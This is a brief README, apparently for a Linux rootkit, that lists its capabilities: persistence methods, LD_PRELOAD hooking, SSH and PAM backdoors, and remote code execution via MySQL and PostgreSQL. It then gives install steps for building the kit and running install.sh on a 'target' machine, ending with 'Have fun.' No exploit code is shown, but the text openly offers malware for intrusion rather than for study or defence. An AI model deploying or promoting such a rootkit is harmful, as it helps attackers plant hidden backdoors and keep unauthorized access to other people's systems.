## Features
Simple rootkit with mass access:

- Few persist methods
- LD_PRELOAD
- SSH Backdoor
- PAM Backdoor
- RCE MySQL/PG

## Install
```
cd ./PRE
./pre.sh
cd -
```

Copy CLIENT to ./src/CLIENT/
Put needed SSH and PAM version into ./src/

Copy to target
```
./install.sh
```
Have fun.
